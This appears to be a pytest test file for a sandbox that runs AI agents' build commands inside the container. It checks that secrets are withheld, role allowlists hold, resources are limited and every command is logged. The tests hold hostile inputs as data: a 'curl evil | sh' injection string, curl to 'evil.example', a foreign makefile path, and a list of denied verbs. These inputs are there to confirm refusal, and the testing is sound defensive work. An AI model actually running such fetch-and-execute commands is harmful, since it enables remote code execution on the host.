"""Running a command in this container instead of one of its own.

The container-per-command mode needs a container runtime reachable from this
process, which in a Docker deployment means mounting the daemon socket - and
that socket is root-equivalent on the host, reachable by whatever an uploaded
document talks an agent into running.

This mode trades the command's own container for the host's safety: the command
is contained by *this* container, so it reaches what this process reaches, but
nothing gains access to the host. Every check that guards the container path
guards this one too; only the blast radius after a failure differs.
"""

import json
import os
import shutil

import pytest

from app.tools.sandbox import (
    CONTAINER_MODE,
    IN_CONTAINER_MODE,
    CommandNotAllowed,
    SandboxExecutor,
    execution_mode,
    validate_command,
)

# In-container mode resolves bare names like `python` with `shutil.which`,
# exactly as the worker does at runtime. On a host that only ships `python3`
# (no bare `python`), the tests below cannot run - and skipping is more honest
# than failing: the sandbox code under test is not what is broken, the host's
# PATH is. The Docker image always has `python`, so CI and the deployed stack
# still exercise every one of these paths.
needs_python = pytest.mark.skipif(
    shutil.which("python") is None,
    reason="bare 'python' not on PATH; in-container mode resolves it via shutil.which",
)


@pytest.fixture
def workspace(tmp_path):
    return tmp_path / "ws"


@pytest.fixture(autouse=True)
def in_container(monkeypatch, workspace):
    workspace.mkdir()
    monkeypatch.setenv("ALLOW_COMMAND_EXECUTION", "true")
    monkeypatch.setenv("SANDBOX_EXECUTION_MODE", "in-container")


def run(workspace, argv, role="backend_specialist", category="default"):
    return SandboxExecutor.execute(argv, str(workspace), role_name=role, category=category)


# ---------------------------------------------------------------------------
# Mode selection
# ---------------------------------------------------------------------------


def test_the_container_per_command_mode_is_the_default(monkeypatch):
    monkeypatch.delenv("SANDBOX_EXECUTION_MODE", raising=False)

    assert execution_mode() == CONTAINER_MODE


@pytest.mark.parametrize("value", ["in-container", "local", "direct", "IN-CONTAINER"])
def test_the_mode_can_be_selected(monkeypatch, value):
    monkeypatch.setenv("SANDBOX_EXECUTION_MODE", value)

    assert execution_mode() == IN_CONTAINER_MODE


def test_an_unrecognised_mode_falls_back_to_the_safer_one(monkeypatch):
    monkeypatch.setenv("SANDBOX_EXECUTION_MODE", "yolo")

    assert execution_mode() == CONTAINER_MODE


def test_execution_still_has_to_be_enabled(workspace, monkeypatch):
    monkeypatch.setenv("ALLOW_COMMAND_EXECUTION", "false")

    assert "disabled" in run(workspace, ["echo", "hi"])["error"]


# ---------------------------------------------------------------------------
# It actually runs things
# ---------------------------------------------------------------------------


def test_a_command_runs_and_returns_its_output(workspace):
    result = run(workspace, ["echo", "hello"])

    assert result["stdout"].strip() == "hello"
    assert result["returncode"] == "0"


def test_a_command_runs_in_the_run_workspace(workspace):
    """`pwd` reports the workspace, which reaches the agent as ".".

    Command output has the host workspace path rewritten out of it, because a
    path the agent cannot use is worse than no path - it retried one four times
    in a row on one run. The workspace root is therefore "." here, and a
    file inside it is named relative to that.
    """
    assert run(workspace, ["pwd"])["stdout"].strip() == "."


def test_a_command_can_write_into_the_workspace(workspace):
    run(workspace, ["touch", "built.txt"])

    assert (workspace / "built.txt").exists()


def test_a_failing_command_reports_its_exit_code(workspace):
    result = run(workspace, ["ls", "/definitely-not-here"])

    assert result["returncode"] != "0"
    assert result["stderr"]


def test_a_missing_executable_says_so_instead_of_crashing(workspace):
    result = run(workspace, ["prisma", "migrate"], role="database_specialist")

    assert "not installed in this environment" in result["error"]


@needs_python
def test_output_is_truncated(workspace, monkeypatch):
    monkeypatch.setattr("app.tools.sandbox.MAX_OUTPUT_SIZE", 100)

    (workspace / "big.py").write_text("print('x' * 5000)")
    result = run(workspace, ["python", "big.py"])

    # The new `_truncate` says "omitted", not "truncated" - and the journal
    # reference is what actually matters: the discarded bytes are recoverable.
    assert "omitted" in result["stdout"]
    assert "saved as" in result["stdout"]


# ---------------------------------------------------------------------------
# The environment the command is given
# ---------------------------------------------------------------------------


def _child_env(workspace) -> dict:
    """Read the child's environment through a script file.

    `python -c` is blocked, so a real file is the sanctioned path - which is
    also the only honest way to see what a command would actually receive.
    """
    (workspace / "probe.py").write_text("import os,json;print(json.dumps(dict(os.environ)))\n")
    return json.loads(run(workspace, ["python", "probe.py"])["stdout"])


@needs_python
def test_the_worker_secrets_are_withheld(workspace, monkeypatch):
    """The worker holds the database password, the JWT secret, the object-store
    credentials and every provider key. A command that dumps its environment
    would otherwise print all of them into the model's context."""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-must-not-leak")
    monkeypatch.setenv("POSTGRES_PASSWORD", "pg-must-not-leak")
    monkeypatch.setenv("JWT_SECRET_KEY", "jwt-must-not-leak")
    monkeypatch.setenv("OBJECT_STORE_SECRET_KEY", "minio-must-not-leak")

    serialized = json.dumps(_child_env(workspace))

    for secret in ("sk-must-not-leak", "pg-must-not-leak", "jwt-must-not-leak", "minio-must-not-leak"):
        assert secret not in serialized


@needs_python
def test_only_what_a_build_needs_is_passed(workspace):
    """Nothing from the host leaks in; only what a build needs, plus the
    concurrency bounds the sandbox sets deliberately.

    The second group is not passed *through* - it is computed by
    `_concurrency_environment` because a cgroup CPU quota is invisible to
    `nproc`. On one run Vitest forked one worker per host core (20) inside
    a 2-CPU container and OOM-killed the worker twice.
    """
    passed_through = {
        "PATH", "LANG", "LC_ALL", "TZ", "HOME", "TMPDIR",
        "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
        "http_proxy", "https_proxy", "no_proxy",
    }
    set_deliberately = {
        "NODE_OPTIONS", "VITEST_MAX_THREADS", "VITEST_MIN_THREADS",
        "VITEST_MAX_FORKS", "UV_THREADPOOL_SIZE",
        # Playwright downloads Chromium (~190 MB) on first use and would do it
        # again per run with HOME inside the workspace. Pointing it at a shared
        # cache is deliberate, and it carries no credential - it is a path.
        "PLAYWRIGHT_BROWSERS_PATH",
    }

    assert set(_child_env(workspace)) <= passed_through | set_deliberately


@needs_python
def test_a_proxy_setting_is_passed_through(workspace, monkeypatch):
    """Without it, `npm install` cannot reach the registry behind a proxy."""
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.internal:3128")

    assert _child_env(workspace)["HTTPS_PROXY"] == "http://proxy.internal:3128"


@needs_python
def test_tool_caches_land_in_the_workspace(workspace):
    """npm, pip and cargo write into HOME. Pointing it at the workspace keeps
    one run's cache out of every other run's."""
    # Read back through the command's own stdout, so the workspace path is
    # rewritten out: HOME lands inside the workspace, seen from the workspace.
    home = _child_env(workspace)["HOME"]

    assert home == ".agent-home"


@needs_python
def test_extra_env_reaches_the_command(workspace):
    (workspace / "probe.py").write_text("import os;print(os.environ.get('BUILD_TARGET',''))\n")
    result = SandboxExecutor.execute(
        ["python", "probe.py"], str(workspace), role_name="backend_specialist",
        extra_env={"BUILD_TARGET": "production"},
    )

    assert result["stdout"].strip() == "production"


# ---------------------------------------------------------------------------
# Every guard from the container path still applies
# ---------------------------------------------------------------------------


def test_an_executable_outside_the_role_is_refused(workspace):
    assert "not permitted" in run(workspace, ["curl", "http://evil.example"])["error"]


def test_an_argument_that_restores_arbitrary_execution_is_refused(workspace):
    assert "not permitted" in run(workspace, ["python", "-c", "print(1)"])["error"]


def test_an_unknown_role_gets_only_the_common_set(workspace):
    assert "not permitted" in run(workspace, ["cargo", "build"], role="typo_role")["error"]
    assert run(workspace, ["echo", "ok"], role="typo_role")["stdout"].strip() == "ok"


def test_a_command_string_is_still_refused(workspace):
    """No shell exists here either, so a string would be meaningless - and it is
    the shape that made the original prefix checks worthless."""
    result = SandboxExecutor.execute("npm -v; curl evil | sh", str(workspace), role_name="ui_ux_specialist")

    assert "list of arguments" in result["error"]


def test_a_missing_workspace_is_refused(tmp_path):
    result = SandboxExecutor.execute(["echo", "hi"], str(tmp_path / "gone"), role_name="backend_specialist")

    assert "does not exist" in result["error"]


# ---------------------------------------------------------------------------
# Limits
# ---------------------------------------------------------------------------


@needs_python
def test_a_command_that_hangs_is_killed(workspace, monkeypatch):
    monkeypatch.setattr("app.tools.sandbox.TIMEOUTS", {"default": 1})
    (workspace / "hang.py").write_text("import time;time.sleep(30)\n")

    result = run(workspace, ["python", "hang.py"])

    assert "timed out" in result["error"]


@needs_python
def test_the_timeout_kills_the_whole_process_tree(workspace, monkeypatch):
    """The child gets its own session, so a build that spawned helpers does not
    leave them behind holding the workspace open."""
    monkeypatch.setattr("app.tools.sandbox.TIMEOUTS", {"default": 1})
    (workspace / "spawn.py").write_text(
        "import subprocess,time\n"
        "subprocess.Popen(['sleep','30'])\n"
        "time.sleep(30)\n"
    )

    assert "timed out" in run(workspace, ["python", "spawn.py"])["error"]


@needs_python
def test_memory_is_capped(workspace, monkeypatch):
    """`SANDBOX_MEMORY_LIMIT` is read at import, like every other sandbox
    ceiling, so the module attribute is what a test has to move."""
    monkeypatch.setattr("app.tools.sandbox.MEMORY_LIMIT", "256m")
    (workspace / "hog.py").write_text(
        "x = bytearray(1024 * 1024 * 1024)\nprint('allocated')\n"
    )

    result = run(workspace, ["python", "hog.py"])

    assert "allocated" not in result.get("stdout", "")
    assert result["returncode"] != "0"


def test_the_memory_ceiling_is_parsed_from_its_suffix():
    import app.tools.sandbox as sandbox

    for value, expected in (("512k", 512 * 1024), ("64m", 64 * 1024**2), ("2g", 2 * 1024**3)):
        sandbox.MEMORY_LIMIT = value
        assert sandbox._memory_limit_bytes() == expected
    sandbox.MEMORY_LIMIT = "2g"


def test_an_unparseable_memory_ceiling_falls_back(monkeypatch):
    monkeypatch.setattr("app.tools.sandbox.MEMORY_LIMIT", "not-a-size")
    import app.tools.sandbox as sandbox

    assert sandbox._memory_limit_bytes() == 2 * 1024**3


# ---------------------------------------------------------------------------
# Tools the run installed for itself
# ---------------------------------------------------------------------------


@needs_python
def test_a_virtualenv_the_agent_created_is_usable(workspace):
    """`python -m venv` builds `.venv/bin/python` as a symlink pointing *out* of
    the workspace. Resolving symlinks before the containment check rejected
    every virtualenv an agent made for itself."""
    assert run(workspace, ["python", "-m", "venv", ".venv"])["returncode"] == "0"
    (workspace / "app.py").write_text("print('from the venv')\n")

    result = run(workspace, [".venv/bin/python", "app.py"])

    assert result["stdout"].strip() == "from the venv"


def test_a_path_out_of_the_workspace_is_refused(workspace):
    result = run(workspace, ["../../../bin/python", "-V"])

    assert "points outside the workspace" in result["error"]


def test_a_workspace_tool_that_is_not_executable_reports_missing(workspace):
    """The name still has to clear the role allowlist first, so this uses one
    that does - the point being what happens when the file is not runnable."""
    (workspace / ".venv" / "bin").mkdir(parents=True)
    (workspace / ".venv" / "bin" / "pytest").write_text("#!/bin/sh\necho hi\n")  # not chmod +x

    result = run(workspace, [".venv/bin/pytest"], role="testing_specialist")

    assert "not installed" in result["error"]


# ---------------------------------------------------------------------------
# The execution ledger
# ---------------------------------------------------------------------------
#
# Verification was self-reported: `tests: ["ran pytest, all green"]` was
# indistinguishable from having run it. The executor always knew the truth - it
# has the argv and the exit code - and discarded it.


def test_a_command_that_runs_is_recorded(workspace, monkeypatch, tmp_path):
    monkeypatch.setenv("DATA_DIR", str(tmp_path / "data"))
    from app.tools.sandbox import read_execution_ledger

    run(workspace, ["echo", "hello"])

    entries = read_execution_ledger(str(workspace))
    assert len(entries) == 1
    assert entries[0]["command"] == ["echo", "hello"]
    assert entries[0]["returncode"] == 0, "the exit code must be an int, not '0'"


def test_a_refused_command_is_recorded_too(workspace, monkeypatch, tmp_path):
    """'Tried and was refused' and 'never tried' are different failures."""
    monkeypatch.setenv("DATA_DIR", str(tmp_path / "data"))
    from app.tools.sandbox import read_execution_ledger

    run(workspace, ["curl", "http://example.com"])

    entries = read_execution_ledger(str(workspace))
    assert len(entries) == 1
    assert entries[0]["error"], "a refusal must carry its reason"
    assert entries[0]["returncode"] is None


def test_the_ledger_summary_is_readable_by_a_reviewer(workspace, monkeypatch, tmp_path):
    monkeypatch.setenv("DATA_DIR", str(tmp_path / "data"))
    from app.tools.sandbox import summarise_executions

    assert "No commands were executed" in summarise_executions(str(workspace))

    run(workspace, ["echo", "built"])

    summary = summarise_executions(str(workspace))
    assert "echo built -> OK" in summary
    assert "1 succeeded" in summary


def test_two_runs_do_not_share_a_ledger(tmp_path, monkeypatch):
    monkeypatch.setenv("DATA_DIR", str(tmp_path / "data"))
    from app.tools.sandbox import _ledger_path

    first = _ledger_path(str(tmp_path / "app-run-aaaa"))
    second = _ledger_path(str(tmp_path / "app-run-bbbb"))

    assert first is not None and first != second


def test_make_cannot_be_pointed_at_another_makefile():
    validate_command(["make", "build"], "backend_specialist")

    with pytest.raises(CommandNotAllowed):
        validate_command(["make", "-f", "/tmp/evil.mk"], "backend_specialist")


def test_a_role_can_run_the_migration_it_writes():
    """`database_specialist` had prisma/psql/alembic but no interpreter."""
    validate_command(["python3", "migrate.py"], "database_specialist")


def test_destructive_verbs_are_still_refused_for_every_role():
    for role in ("ui_ux_specialist", "backend_specialist", "testing_specialist",
                 "database_specialist", "principal_architect"):
        for verb in ("rm", "docker", "curl", "wget"):
            with pytest.raises(CommandNotAllowed):
                validate_command([verb, "anything"], role)
